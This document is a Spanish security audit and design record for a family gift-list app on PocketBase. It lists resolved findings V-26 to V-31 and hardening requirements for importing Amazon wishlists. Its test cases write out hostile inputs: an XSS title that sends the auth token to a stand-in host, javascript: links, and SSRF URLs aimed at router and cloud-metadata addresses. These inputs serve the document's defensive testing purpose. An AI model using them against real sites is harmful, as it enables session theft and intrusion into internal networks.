| Avisos | Cubierta | `buildFacts` descarta lo propio (V-20); lo visto se borra al cambiar de sesión (V-19) |
| `localStorage` | Cubierta | Token, último grupo, ajustes, clave de IA, solicitud pendiente y avisos de la sesión actual |
| **Dispositivo compartido** | **NO cubierta → V-28** | No se puede cerrar sesión |
| Service worker | Cubierta | No guarda `/api/` |
| Reintentos sin red | Cubierta | Solo `GET`, nada en disco |
| XSS (leería la lista con la sesión de otro) | Cubierta | CSP `script-src 'self'`, React sin HTML inyectado, enlaces solo `http(s)` |
| Demo | No es frontera | Datos ficticios en el navegador; sin claves ni URL privadas en `dist-demo` |
| APK | Parcial → V-30 | `allowBackup=false` y WebView no depurable, pero el APK local es de depuración |
| Secretos en el repositorio y en el historial | Cubierta | Solo marcadores en `.env.example`; `.env.local` ignorado y sin rastro |
| Secretos en `dist`, `dist-demo` y APK | Cubierta | Ninguna coincidencia |
| Superusuario, `data.db` y copias del servidor | Fuera de la regla | Quien aloja lo lee todo. Falta decirlo en `SECURITY.md` (V-31) |
| Imagen del regalo como baliza (R-6) | Aceptado | La dueña ve quién abre su lista, no el estado |

### Pendientes de auditorías anteriores

Siguen abiertos, todos bajos y ninguno bloquea: G-12 (`server/Dockerfile` con `node:24-alpine` y `alpine:3.22` sin digest, PocketBase sin `sha256sum`, sin `cap_drop` ni `read_only`, acciones de GitHub y `gitleaks:latest` por etiqueta); G-4 (los códigos de dispositivo caducados no se borran); V-20 (sin `PB_BIN` las suites se saltan en verde: falta el `throw` en CI); V-23 (el token de DuckDNS va en la línea de órdenes de `wget`). Las copias cifradas usan AES-CBC sin autenticación: una copia manipulada no se detecta al descifrar (alternativa: `age`).

### Veredicto

**No apto.** V-26 rompe la regla desde la propia sesión de la dueña con dos peticiones, y está confirmado contra PocketBase real.

Para **apto**:

1. **V-26** corregido, con PB-10 ampliada en verde y PB-14 adaptada. El arreglo son dos hooks y ya está probado en una copia.
2. **V-27** corregido: la copia del grupo es nueva en la 1.0 y hoy escribe en disco justo lo que la regla esconde.
3. **V-28** corregido, o declarado en `SECURITY.md` como riesgo conocido si se deja para la 1.0.1.
4. La release publica un APK de `release` firmado, no el de depuración (V-30).

V-29 y V-31 pueden ir en la misma versión o en la siguiente. Con los puntos 1 y 2 hechos y las pruebas de servidor en verde, no conozco ninguna vía por la que alguien vea o deduzca el estado de su propia lista desde su sesión.

### Estado (2026-11-12, Opus 5.5): V-26 a V-31 corregidos

- **V-26:** `lazo.pb.js`, junto al cortafuegos, los dos hooks propuestos: `onRecordCreateRequest` rechaza con el mismo 400 cualquier `id` elegido por quien no es superusuario, y `onBatchRequest` solo deja `POST` en los lotes (403). PB-10 ampliada en `server/test/rules.test.mjs`: tras quitar un regalo cogido y uno libre, `POST items/records` con cada id da el mismo 400 con el mismo cuerpo, el lote con `PUT` el mismo 403, el libre sigue sin existir y un lote de `POST` sin id (importar) da 200. PB-14 espera ahora 403 en los `PATCH` en lote.
- **V-27:** `src/core/copia.ts` exporta solo `name`, `kind`, `birthYear` y los regalos pedidos de cada lista; fuera `GiftSeen`, `propia`, `sorpresas`, `retirados` y `presupuestoCents`. Sigue en `version: 1`: las copias antiguas con estados se leen igual y `parseCopia` los descarta (prueba nueva). `Settings.tsx`: «La copia lleva solo los regalos que pidió cada persona: nada de reservas, compras, sorpresas ni presupuestos.» `test/core/copia.test.ts`: con todos los miembros enredando en las plazas de todos, `JSON.stringify(copia.listas)` es idéntico para las cinco personas y la copia no casa `/reservas|aportaciones|sorpresas|retirados|presupuesto/` ni lleva la sorpresa ni el presupuesto. La misma expresión sobre el archivo descargado en `e2e/copia.spec.ts`.
- **V-28:** `Api.signOut(everywhere)`. En `PocketBaseApi`, con `everywhere` llama antes a `/api/lazo/logout-all` (el token nuevo no se guarda; si falla, no se cierra nada y se avisa); después `authStore.clear()`, `seenFacts.forget()` y borra `lazo:pendiente:*`, `lazo:last-group` y `lazo:ia`. Se queda `lazo:server` (el APK lo necesita para volver a entrar). En la demo no hace nada. Ajustes → «Sesión»: «Cerrar sesión en este móvil» y «Cerrar sesión en todos los móviles», con confirmación («Para volver a entrar necesitarás un código desde otro móvil o un enlace nuevo de quien organiza») y vuelta a `#/` recargando; en la demo, un aviso en su lugar. Pruebas: `test/api/signout.test.ts` (sin `pocketbase_auth` ni claves `lazo:avisos:`/`pendiente:`; `logout-all` solo con «en todos»; si falla, la sesión sigue) y «V-28» en `rules.test.mjs` (tras `logout-all`, los dos tokens viejos no listan nada y `auth-refresh` da 401; el devuelto sí vale; sin sesión, 401).
- **V-29:** migración `1762890000_limite_restore.js`: `POST /api/lazo/restore`, 3 por minuto, `@auth`. Prueba en `server/test/copia.test.mjs`: la regla está como dice la migración y la cuarta llamada en un minuto responde 429 (las pruebas anteriores suben el tope antes y lo devuelven a 3).
- **V-30:** el APK de release lo firma `scripts/firmar-apk.sh` (clave fuera del repo). `SECURITY.md` cuenta cómo se firma y la comprobación `aapt2 … | grep -c debuggable` → 0 antes de publicar. No se ha ejecutado aquí. Sigue `versionName "0.5.1"` en `android/app/build.gradle`.
- **V-31:** `SECURITY.md` al día: lo que sale sin sesión (`shared` e `invite-info`), filas de enlace de solo lectura, copia del grupo, tiempo real, lotes, sesiones con los botones reales y APK; párrafo «Quien aloja el servidor» junto a R1; lista de pruebas con las de `server/test/*.test.mjs`.
- **Pruebas:** `server/test/*.test.mjs` 63/63 contra PocketBase 0.40.6; `npm run check` en verde (194 pruebas de vitest, 4 saltadas); Playwright sin capturas 112 en verde y 8 saltadas.

### Verificación final (Fable 5.2)

Fecha: 2026-11-12 · Sobre `main` en `7e8a23d` (los arreglos entraron en `1c898ca`, merge `07ef237`).

**Método.** Lectura del diff `1c5af63..HEAD`. Ejecutado: `server/test/*.test.mjs` contra PocketBase 0.40.6 (63/63), `test/core/copia.test.ts` y `test/api/signout.test.ts` (17/17), y una sonda nueva contra un PocketBase temporal con los hooks y migraciones actuales. Sin secretos en los commits nuevos. **No ejecutado:** `scripts/firmar-apk.sh`, el resto de vitest ni Playwright (doy por buenas las cifras de quien aplicó los arreglos), Caddy ni Docker. No se ha tocado código.

| Id | Estado | Comprobación |
|---|---|---|
| V-26 | **Resuelto** | Sonda: `POST items/records` con el id de un regalo quitado da el mismo 400 y el mismo cuerpo estuviera cogido o libre, en JSON y en `multipart`. Lotes con `PUT`, `PATCH` y `DELETE`: el mismo 403 en los dos casos. PB-10 y PB-14 lo cubren |
| V-27 | **Resuelto** | `exportGroup` tiene una sola rama y solo copia `name`, `kind`, `birthYear` y los regalos pedidos. La prueba exige que la copia sea idéntica la descargue quien la descargue |
| V-28 | **Resuelto** | `signOut` y el bloque «Sesión» de Ajustes. Sonda: tras `logout-all`, `auth-refresh` con el token viejo da 401 y con el devuelto 200; el cliente no guarda el devuelto |
| V-29 | **Resuelto** | Sonda: cinco `restore` seguidos dan 200, 200, 200, 429, 429 |
| V-30 | **Resuelto en el proceso, sin verificar el artefacto** | `scripts/firmar-apk.sh` hace `assembleRelease`, firma con una clave fuera del repo (contraseña por fichero, no en la línea de órdenes) y `dist-apk/` está ignorado. `versionName` ya es 1.0.0. No he construido ni abierto el APK firmado |
| V-31 | **Resuelto** | `SECURITY.md` recoge el enlace de solo lectura, la copia, los lotes, la sesión, el APK y «Quien aloja el servidor» |

**Lote `POST` con `?expand=…_via_`.** El cortafuegos **no** lo para: solo mira la URL exterior (`/api/batch`), y la petición interior responde 200. **No filtra nada**, porque cada salto del `expand` pasa por la regla de la colección de destino. Probado con Marta creando un regalo en su lista (que tenía una reserva viva, un presupuesto, un regalo retirado y una sorpresa) con `expand=list.items_via_list.claims_via_item,list.budgets_via_list,list.items_via_list.contributions_via_item,claims_via_item`: la respuesta trae solo sus regalos visibles, sin reservas, presupuesto, retirado ni sorpresa. Control: la misma consulta hecha por Samira sí trae la reserva y el presupuesto. Un `filter` con `_via_` en la URL interior de un `POST` se ignora. El mismo `expand` fuera de un lote da 403.

**Mejoras que no bloquean.**

- Segunda capa en `onBatchRequest`: rechazar también las peticiones interiores cuya `url` case `/_via_|@collection/i` tras descodificarla, para que el lote no dependa solo de las reglas.
- `firmar-apk.sh` no comprueba `debuggable` por sí mismo; hoy es un paso manual de `SECURITY.md`. Añadir al script `"$BT/aapt2" dump badging "$OUT" | grep -q application-debuggable && exit 1`.
- Siguen los bajos antiguos (G-12, G-4, V-20, token de DuckDNS, copias sin autenticación).

**Veredicto: apto.** Con V-26 a V-29 corregidos y probados contra PocketBase real, no conozco ninguna vía por la que alguien vea o deduzca el estado de su propia lista desde su sesión, ni hay secretos en el repositorio o en los builds. Condición de publicación: el APK de la release sale de `scripts/firmar-apk.sh` y `aapt2 dump badging … | grep -c debuggable` da 0 antes de subirlo.

---

## Lista de Amazon (diseño, Fable 5.2)

Fecha: 2026-11-12 · Alcance: diseño de la v1.1 «Lista de Amazon», **antes de implementarla**. Leídos `server/unfurl/{index,fetch,guard,meta}.mjs`, la ruta `/api/lazo/unfurl` (`lazo.pb.js:732-764`) y su límite (`1762850000_lazo.js:222`). No se ha tocado código ni se ha ejecutado nada contra Amazon salvo una lectura de `robots.txt`.

**Recomendación previa** (razonada en `docs/legal/AMAZON.md`): el camino principal es **(b) copiar y pegar**, que no hace peticiones a Amazon. El camino **(a) servidor** no debería entrar en la v1.1; si entra, apagado por defecto. Los requisitos AMZ-1 a AMZ-15 son la condición para que (a) exista; AMZ-9, AMZ-10, AMZ-11, AMZ-15 y AMZ-16 valen también para (b).

**Qué cambia respecto al `unfurl` de hoy.** El `unfurl` genérico acepta cualquier host público y devuelve un producto. La importación de una lista hace varias peticiones seguidas, devuelve hasta 100 filas y solo tiene sentido contra un host. Por eso no debe ser «`unfurl` con una opción»: es una ruta aparte y más estrecha. Dos expresiones que ya existen **no sirven de lista blanca**: `STORES` (`meta.mjs:50`, `/(^|\.)amazon\.[a-z.]+$/`) casa `amazon.evil.com`, y `amazonInfo` (`meta.mjs:9`) casa `amazon.xyz`. Están bien para poner la etiqueta «Amazon», no para decidir adónde se conecta el servidor.

| Severidad si falta | Requisitos |
|---|---|
| Crítico | AMZ-11 (deduplicar en el servidor rompería LA REGLA) |
| Alto | AMZ-2, AMZ-3, AMZ-10, AMZ-13 |
| Medio | AMZ-1, AMZ-4, AMZ-5, AMZ-6, AMZ-7, AMZ-8, AMZ-9, AMZ-12, AMZ-16 |
| Bajo | AMZ-14, AMZ-15 |

### AMZ-1 · Ruta propia, apagada por defecto y solo a petición

- Ruta nueva `POST /api/lazo/amazon-import` (PocketBase, `$apis.requireAuth('users')` y miembro de algún grupo, como `unfurl`) que llama a `POST /wishlist` del servicio `unfurl` con la misma clave `x-lazo-key`. `/unfurl` no cambia ni se relaja.
- Variable del servidor `AMAZON_IMPORT` (por defecto vacía = apagado). Apagada, la ruta responde 404 y `unfurl` no registra `/wishlist`. La enciende quien aloja, no cada usuario.
- Sin `cronAdd`, sin reintentos y sin refresco de precios: una llamada del usuario, una lectura.

**Escenario.** Alguien instala Lazo con el `.env` de ejemplo y, sin saberlo, su servidor empieza a leer Amazon desde la IP de casa.

**Prueba.** `server/test/amazon.test.mjs`: sin `AMAZON_IMPORT`, `POST /api/lazo/amazon-import` da 404 con y sin sesión, y `POST /wishlist` al servicio da 404; con la variable, sin sesión da 401 y sin grupo 403. `grep -c cronAdd` sobre el código nuevo da 0.

### AMZ-2 · La URL la construye el servidor; del usuario solo sale el identificador

El cliente envía el enlace pegado, pero el servidor **no lo visita**: extrae el identificador con una expresión anclada (`^https://www\.amazon\.es/hz/wishlist/(?:ls|genericItemsPage)/([A-Z0-9]{10,16})(?:[/?#]|$)`, a ajustar con listas reales) y construye él `https://www.amazon.es/hz/wishlist/ls/<ID>`. Se descartan query, fragmento, puerto, credenciales y cualquier otra ruta. Si no casa: 400 `not_a_list`, sin petición de red.

**Escenario.** Un miembro manda `https://www.amazon.es/gp/redirect.html?location=http://192.168.1.1/` o `https://www.amazon.es@evil.example/hz/wishlist/ls/X`: si el servidor visitara lo pegado, serviría de sonda de la red de casa o de proxy hacia cualquier ruta de Amazon.

**Prueba.** `server/unfurl/test/wishlist.test.mjs` con un `lookup` espía: para `www.amazon.es@evil.example`, `www.amazon.es.evil.example`, `evil.example/www.amazon.es/hz/wishlist/ls/X`, `http://` en vez de `https://`, `:8443`, `WWW.AMAZON.ES.` con punto final, `amazon.com`, `smile.amazon.es`, `/gp/redirect.html?…`, `/dp/B000000000` y un id con `../` o `%2F`, la respuesta es `not_a_list` y el espía registra **cero** resoluciones DNS. Para un enlace válido con `?ref_=…&x=http://10.0.0.1`, la única URL pedida es la canónica sin query.

### AMZ-3 · Lista blanca de host en cada salto

Toda petición de esta ruta, la primera y cada redirección, debe cumplir a la vez: `protocol === 'https:'`, `hostname === 'www.amazon.es'` (comparación exacta tras `new URL`, sin sufijos ni expresiones regulares), puerto vacío y ruta que empieza por `/hz/wishlist/`. Máximo 2 redirecciones. Una redirección a cualquier otro sitio **aborta sin seguirla**, también dentro de amazon.es:

- `/ap/signin…` → `private_list` (la lista no es pública);
- `/errors/validateCaptcha…` → `amazon_blocked` (AMZ-8);
- otro host u otra ruta → `blocked`.

**Escenario.** Amazon tiene redirectores (`/gp/redirect.html`). Una lista cuya URL acaba en un 302 hacia `http://unfurl:8787/health` o hacia el router convierte la importación en un SSRF con el sello de un host de confianza.

**Prueba.** Servidor local de pruebas que hace de `www.amazon.es` (con `opts.lookup`, como en `unfurl.test.mjs`): 302 a `https://evil.example/`, a `https://amazon.es/…` sin `www`, a `http://www.amazon.es/…`, a `https://www.amazon.es/gp/redirect.html?…` y a `https://www.amazon.es/ap/signin` → error con el código esperado y **ninguna** segunda conexión. Tres redirecciones válidas seguidas → `too_many_redirects`.

### AMZ-4 · Enlace corto `amzn.eu`

`amzn.eu` es un redirector público: no puede entrar en la lista blanca de AMZ-3. Dos opciones, de menos a más código:

1. **Preferida:** no resolverlo en el servidor. El cliente dice «abre el enlace y pega la dirección larga».
2. Si se resuelve: una sola petición a `https://amzn.eu/<ruta>` (host exacto, ruta `^/[A-Za-z0-9/_-]{1,40}$`), **sin leer el cuerpo**, que debe responder 301 o 302; el `Location` no se sigue: se le aplica AMZ-2 para sacar el identificador. Cualquier otra respuesta → `not_a_list`.

**Escenario.** `amzn.eu/d/xxxx` apunta a un producto, a una página de vendedor o, vía redirector, a otro host; si el servidor siguiera la cadena, AMZ-3 quedaría en nada.

**Prueba.** Servidor de pruebas como `amzn.eu`: 302 a una lista válida → se pide solo la canónica; 302 a `https://evil.example/hz/wishlist/ls/X`, a `/dp/…`, 200 con cuerpo de 50 MB y 302 en cadena → `not_a_list`, con menos de 1 kB leído y ninguna conexión a un tercer host.

### AMZ-5 · La guardia de IP y DNS sigue activa debajo de la lista blanca

La lista blanca de nombres no sustituye a `safeLookup` (`fetch.mjs:12-22`): la conexión va a la IP validada, y si **alguna** IP devuelta es privada, se rechaza. `allowPrivate` sigue sin ser alcanzable por HTTP.

**Escenario.** El DNS del homelab (Pi-hole, `hosts`, un router comprometido) resuelve `www.amazon.es` a `192.168.1.1`: sin la guardia, el nombre «bueno» lleva al panel del router.

**Prueba.** `lookup` falso que devuelve `127.0.0.1`, `169.254.169.254` y `::ffff:10.0.0.1` para `www.amazon.es` → `blocked` sin abrir socket; y uno que devuelve una pública y una privada → `blocked`.

### AMZ-6 · Paginación acotada y sin fiarse de la página

- Como mucho **5 páginas** y **100 productos**; se corta en lo primero que llegue.
- La dirección de «más resultados» sale del HTML, así que es dato no fiable: solo se acepta si, resuelta contra la página, cumple AMZ-3 **y** contiene el mismo identificador de lista. Lo demás termina la importación con lo ya leído.
- Fin también si una página no aporta ningún ASIN nuevo o repite el testigo de paginación (bucle).
- **Sin tarro de cookies:** no se guardan ni se reenvían `Set-Cookie` entre páginas. Si Amazon exige sesión para la segunda página, se importa solo la primera y se dice.
- Una pausa de al menos 1 s entre páginas.

**Escenario.** Una página manipulada (o un cambio de Amazon) devuelve un enlace de paginación que apunta a sí mismo o a otra lista: peticiones sin fin útil, o productos de una lista ajena mezclados con los propios.

**Prueba.** Fixtures: lista de 7 páginas → exactamente 5 peticiones; página con 150 productos → 100; siguiente página con otro id, con otro host o idéntica a la actual → se detiene y devuelve lo leído con `partial: true`; respuesta con `Set-Cookie` → la petición siguiente no lleva `Cookie`.

### AMZ-7 · Topes de tamaño y de tiempo

| Tope | Valor propuesto | Nota |
|---|---|---|
| Cuerpo por página | 3 MB | Hoy `LIMITS.maxBytes` es 1,5 MB y, al pasarse, **corta y analiza lo leído** (`fetch.mjs:75-80`). Para una lista eso perdería productos en silencio: aquí, si se corta, la respuesta lleva `partial: true` |
| Total de la importación | 10 MB | Suma de las páginas |
| Tiempo por página | 6 s totales | El `kill` de G-8, no solo inactividad |
| Tiempo de la importación | 25 s, **un único plazo** | Incluye las pausas. No 5 × 6 s más pausas sin tope |
| `$http.send` en PocketBase | 30 s | Hoy 10 s (`lazo.pb.js:748`): con menos, PocketBase se rinde y `unfurl` sigue trabajando para nadie |
| Cabeceras | 32 kB | Como hoy |
| Compresión | Sin `Accept-Encoding` | Como hoy: no hay bomba de descompresión |
| Cuerpo de la petición del cliente | 4 kB | Como hoy |
| En curso a la vez | 1 por usuario, 1 en todo el servidor | Ver AMZ-12 |
| Contenedor | `mem_limit` y `pids_limit` en `unfurl` | Pendiente desde G-12; con 10 MB en memoria por importación deja de ser opcional |

**Escenario.** Una respuesta que gotea un byte por segundo durante cinco páginas, o cinco páginas de 50 MB, dejan al servicio sin memoria y a la familia sin vista previa de enlaces.

**Prueba.** Servidor de pruebas: goteo lento → `timeout` antes de 26 s medido con reloj; cuerpo de 50 MB → se cierra el socket al pasar de 3 MB (bytes recibidos < 3,2 MB) y `partial: true`; cinco páginas de 2,9 MB → se detiene al superar 10 MB. En `server/test/amazon.test.mjs`: el servicio tarda 28 s y PocketBase responde el error del servicio, no un 500 por plazo propio.

### AMZ-8 · Captcha, 503 o inicio de sesión: parar y no insistir

- Se considera bloqueo: estado 429 o 503; redirección a `/errors/validateCaptcha`; un 200 cuyo HTML contiene el formulario `action="/errors/validateCaptcha"` o cuyo `<title>` casa `NOT_A_PRODUCT` (`meta.mjs:56`).
- Ante un bloqueo: **ninguna petición más** en esa importación, ni reintento, ni cambio de `User-Agent`, ni cabeceras de navegador. El `User-Agent` es el `LazoBot/1.0 (+repo)` de hoy, siempre.
- **Cortacircuitos:** tras un bloqueo, la ruta responde `amazon_blocked` a todo el mundo durante 1 hora sin tocar la red. Protege la IP de casa, que es la misma desde la que la familia compra.
- El cliente ofrece el camino (b).

**Escenario.** Amazon empieza a pedir captcha; tres personas de la familia pulsan «reintentar» diez veces cada una. Sin cortacircuitos, la IP de casa acaba marcada.

**Prueba.** Fixture de captcha con 200, con 503 y como redirección → `amazon_blocked` tras **una** petición; segunda llamada (otro usuario) dentro de la hora → `amazon_blocked` con cero conexiones (espía en `lookup`). `grep` en `server/unfurl/` de `Chrome|Safari|Gecko|sec-ch-ua|Cookie` da 0 coincidencias fuera de las pruebas.

### AMZ-9 · Títulos: texto plano y acotado

El título es texto que escribió un vendedor: dato hostil. Antes de devolverlo:

1. descodificar entidades **una vez** (`decode` de `meta.mjs`), nunca dos;
2. quitar caracteres de control (`\u0000-\u001f`, `\u007f-\u009f`) y de dirección de texto (`‪-‮`, `⁦-⁩`), que permiten disfrazar un título;
3. colapsar espacios y cortar a `LIMITS.title` (200).

No se quitan `<` ni `>`: el título se guarda tal cual y **se pinta siempre como texto** (nodo de texto de React). No se introduce `dangerouslySetInnerHTML`, `innerHTML` ni Markdown en ningún sitio que muestre regalos, avisos o la copia del grupo.

**Escenario.** Un producto se llama `<img src=x onerror=fetch('//x.example/'+localStorage.pocketbase_auth)>`. Entra en la lista de la abuela y lo ve toda la familia. Hoy la CSP y React lo paran; el requisito es que siga siendo así en cada pantalla nueva.

**Prueba.** `test/core/amazon-list.test.ts` (función pura compartida por (a) y (b)): títulos con `<script>`, `&lt;img onerror&gt;`, `&amp;lt;b&amp;gt;` (queda `&lt;b&gt;` literal, no `<b>`), `‮`, saltos de línea y 5 000 caracteres → salida sin controles, ≤ 200. Playwright: importar la fixture hostil y comprobar que dentro de las tarjetas de regalo no hay ningún `img[src="x"]`, `script` ni `b`, y que no se disparó ningún `dialog` ni petición a otro origen. La comprobación que ya exista de que `src/` no usa `dangerouslySetInnerHTML` ni `innerHTML` sigue en verde.

### AMZ-10 · Enlaces, fotos y precios: se construyen, no se copian

- **Enlace del regalo:** nunca se copia un `href` de la página. Se extrae el ASIN, se valida con `^[A-Z0-9]{10}$` y se construye `https://www.amazon.es/dp/<ASIN>`. Sin ASIN válido, la fila se descarta.
- **Foto:** solo `https:` y solo hosts de imágenes de Amazon por lista cerrada (`m.media-amazon.com`, `images-eu.ssl-images-amazon.com`, `images-na.ssl-images-amazon.com`; confirmar con listas reales), sin puerto ni credenciales. Si no cumple, el regalo se importa sin foto.
- **Precio:** entero en céntimos con `parseAmount`, moneda fija `EUR`; si no se entiende, sin precio.
- **Nada más sale de la página:** ni comentarios, ni prioridad, ni cantidad, ni vendedor, ni nombre de la dueña.
- **Deuda que hay que saldar antes:** según la revisión v0.3, `ItemSheet.tsx` pintaba `href={item.url}` sin comprobar `^https?://` (G-13). Comprobar que está cerrado: con 100 enlaces entrando de golpe deja de ser opcional.

**Escenario.** Una fila trae `href="javascript:…"` o una foto en `https://x.example/p.png?u=abuela`: lo primero es un XSS a un clic; lo segundo, cien balizas (R-6) que dicen a un tercero quién abre la lista y cuándo.

**Prueba.** Misma prueba pura: filas con `javascript:alert(1)`, `data:text/html,…`, `//evil.example/dp/B000000000`, ASIN de 9 caracteres o con `/`, foto en `http://`, en `m.media-amazon.com.evil.example` y en `evil.example` → el enlace es siempre `https://www.amazon.es/dp/<ASIN>` o la fila no existe, y la foto es de la lista cerrada o `undefined`. Propiedad: para cualquier entrada, toda `url` de salida casa `^https://www\.amazon\.es/dp/[A-Z0-9]{10}$`.

### AMZ-11 · La importación no escribe y no compara con lo oculto (LA REGLA)

- La ruta devuelve una **vista previa** (`[{ title, image, priceCents, asin }]`) y nada más. No recibe ningún id de lista ni de grupo y no lee `items`, `claims` ni ninguna colección salvo la pertenencia a un grupo.
- Los regalos los crea el cliente por el camino que ya existe (lote de `POST` troceado en 50, V-26), con las reglas de siempre: cada cual escribe solo en su plaza.
- **El «ya lo tienes» se calcula en el cliente**, sobre los regalos que la dueña ve. El servidor nunca deduplica por ASIN.

**Escenario.** Marta quitó de su lista unos auriculares que ya estaban reservados: la fila sigue existiendo, oculta para ella. Reimporta su lista de Amazon. Si el servidor dijera «1 duplicado omitido», o creara 11 filas en vez de 12, sabría que alguien se los ha cogido. Es el oráculo de V-26 por otra puerta.

**Prueba.** En `server/test/rules.test.mjs`, junto a PB-10: Marta tiene dos regalos de Amazon, A (reservado por Samira) y B (libre); quita los dos; importa una lista que contiene ambos ASIN. La respuesta de `amazon-import` y la del lote de creación tienen el mismo estado y la misma forma para A y para B, se crean dos filas nuevas y `GET items` de Marta muestra lo mismo en los dos casos. Además: `amazon-import` devuelve lo mismo llamada por Marta que por Samira con el mismo enlace (no depende del estado de nadie).

### AMZ-12 · Límite por usuario y límite global

- **Por usuario:** 3 importaciones cada 10 minutos y 10 al día; una sola en curso. Las reglas de límite de PocketBase cuentan por IP y audiencia, y en casa toda la familia sale por la misma IP: hace falta un contador por `e.auth.id` (en `$app.store()`, o una colección si debe sobrevivir a un reinicio). Además, la regla `{ label: 'POST /api/lazo/amazon-import', maxRequests: 6, duration: 600, audience: '@auth' }` como red.
- **Global hacia Amazon:** una importación a la vez en todo el servidor y como mucho 30 páginas por hora, contadas en `unfurl` (que es quien sale a la red), para que el tope no dependa de PocketBase.
- Los rechazos por límite cuentan como intento y no tocan la red.

**Escenario.** Un sobrino con sesión lanza la importación en bucle con `curl`: 20 por minuto × 5 páginas son 100 peticiones por minuto a Amazon desde la IP de casa.

**Prueba.** `server/test/amazon.test.mjs` con `unfurl` simulado: cuarta llamada del mismo usuario en 10 minutos → 429 y el simulador cuenta 3; otro usuario sigue pudiendo (el cubo no es compartido); dos llamadas simultáneas del mismo usuario → una 429. En `wishlist.test.mjs`: con el reloj inyectado, la página 31 de la hora → `rate_limited` sin conexión.

### AMZ-13 · Que no sirva de proxy abierto

- La respuesta contiene **solo** la lista de AMZ-11 y un código de un conjunto cerrado (`not_a_list`, `private_list`, `amazon_blocked`, `rate_limited`, `timeout`, `empty`, `error`). Nunca HTML, cabeceras, la URL final, el estado HTTP de Amazon ni mensajes de excepción.
- Si no se reconoce **ningún** producto, la respuesta es `empty`: una página que no sea una lista no produce datos.
- Sin sesión no hay ruta (401). No se expone por el enlace de solo lectura ni por `invite-info`. El servicio `unfurl` sigue sin puertos publicados y exige `x-lazo-key` también en `/wishlist`. Caddy no publica nada nuevo.
- Sin caché de respuestas (tampoco «para ahorrar peticiones»): una caché por URL compartida entre usuarios sería un almacén de páginas de Amazon y un canal entre cuentas.
- La demo pública (`DemoApi`) no llama nunca a esta ruta: en la demo solo existe el camino (b).

**Escenario.** Un miembro curioso, o alguien con una sesión robada, intenta usar el servidor de la familia para leer páginas de Amazon a su antojo (precios, reseñas, páginas de vendedor) o para distinguir, por el error, qué hay en la red de casa.

**Prueba.** Para cada fixture (lista, captcha, producto suelto, página de inicio, 404, 500), el cuerpo de la respuesta casa un esquema estricto (sin propiedades de más) y no contiene `<`, ni `http` fuera de `image`, ni texto de la fixture que no sea un título. Los errores `blocked`, `network` y `http_*` del servicio llegan al cliente como el mismo `error`. `server/test/caddyfile.test.mjs`: `/wishlist` y el puerto 8787 no son alcanzables desde fuera. `e2e`: en la demo, el botón del camino (a) no existe y no sale ninguna petición a `/api/lazo/amazon-import`.

### AMZ-14 · El identificador de la lista no se guarda ni se registra

El identificador de la lista de deseos enlaza a una persona de Lazo con su perfil de Amazon (nombre, a veces ciudad de envío). Viaja en el **cuerpo** del `POST`, nunca en la query (los registros de PocketBase guardan las URL), no se escribe en ninguna colección ni en la salida de `unfurl`, y el nombre de la dueña que aparece en la página no se extrae.

**Escenario.** Quien administra el servidor, o quien se haga con una copia de `data.db`, obtiene la lista de Amazon de cada familiar y, con ella, su nombre real y lo que desea fuera de Lazo.

**Prueba.** Tras una importación con un identificador centinela: `grep` del centinela en `data.db`, en `auxiliary.db` (registros) y en la salida estándar de `unfurl` → 0 coincidencias. La copia del grupo (`exportGroup`) tampoco lo contiene.

### AMZ-15 · El analizador aguanta entradas hostiles

Vale para el HTML del camino (a) y para lo pegado en el (b). Expresiones con cuantificadores acotados (como ya hace `meta.mjs`: `[^>]{0,1000}`), sin retroceso catastrófico; entrada cortada al tope antes de analizar; como mucho 100 filas de salida; `JSON.parse` solo dentro de `try`.

**Escenario.** Un pegado de 2 MB hecho de `<a <a <a …` congela la pestaña (camino b) o un núcleo del servidor durante minutos (camino a).

**Prueba.** `test/core/amazon-list.test.ts`: 3 MB de `<` repetido, de `<li data-itemid="` sin cerrar, de espacios y de bytes aleatorios → termina en menos de 500 ms y devuelve ≤ 100 filas. La fixture de una lista real (guardada sin datos personales) da el número de productos esperado; cuando Amazon cambie la página, esta es la prueba que debe romperse.

### AMZ-16 · El camino (b) cumple lo mismo en el cliente

- La misma función pura (`src/core`) de AMZ-9, AMZ-10 y AMZ-15 procesa lo pegado. Una sola implementación, dos entradas.
- Tope del pegado: 2 MB. Lo pegado **no se inserta en el DOM** (ni `innerHTML` ni un `contenteditable` que lo pinte): se lee del evento `paste` (`text/html` si existe, porque el texto plano no trae los ASIN ni las fotos; `text/plain` si no) y se analiza como cadena o con `DOMParser`, que produce un documento inerte.
- La CSP no cambia: no se añade `amazon.es` a `connect-src`. El camino (b) no hace **ninguna** petición.
- Lo pegado no se guarda en `localStorage`, no se envía a la IA y no llega al servidor: solo llegan los regalos que la dueña confirma.
- El deduplicado es el de AMZ-11: sobre lo que ella ve.

**Escenario.** La página copiada incluye, en la sección de recomendados, un producto con un título o un enlace hostil; o el usuario pega por error el contenido de otra web. Sin las mismas reglas, el camino «seguro» sería la puerta de entrada del XSS.

**Prueba.** Playwright con la red vigilada: pegar la fixture hostil de AMZ-9 y AMZ-10 → cero peticiones a orígenes distintos del propio hasta confirmar; después, solo las fotos de la lista cerrada; y las mismas aserciones de DOM que en AMZ-9. `localStorage` no contiene ningún trozo de lo pegado. `index.html` y `Caddyfile`: `connect-src` idéntico al de la 1.0.

### Orden propuesto

1. Camino (b) con AMZ-9, AMZ-10, AMZ-11, AMZ-15 y AMZ-16, comprobando de paso el `href` de G-13.
2. Decidir si (a) hace falta a la vista del uso real de (b). Si se hace: AMZ-1 a AMZ-8 y AMZ-12 a AMZ-14, con las pruebas escritas antes que el código y `AMAZON_IMPORT` apagado en el `.env` de ejemplo.

## Verificación v1.1 Amazon (Fable 5.2)

Revisado el 2026-11-12 sobre `main` (`9697929`). Alcance: el modo manual (camino b) y «Compartir → Lazo» en Android. Leídos `src/core/amazonLista.ts`, `src/core/amazon.ts`, `src/ui/screens/AmazonLista.tsx`, `AddGift.tsx`, `src/ui/compartido.ts`, `src/main.tsx`, `SharePlugin.java`, `MainActivity.java`, `AndroidManifest.xml`, `index.html`, los hooks de `items` y `e2e/amazon-lista.spec.ts`. Ejecutado `test/core/amazonLista.test.ts`: 20 de 20 en verde. No se ha probado en un Android real ni se ha ejecutado Playwright en esta revisión.

**Resultado:** ningún hallazgo crítico ni alto. LA REGLA se mantiene: la importación no añade ninguna vía de lectura y el servidor no deduplica. Un requisito queda a medias (AMZ-15) y hay cinco hallazgos bajos más.

### Estado de cada requisito

| Requisito | Estado | Comprobación |
|---|---|---|
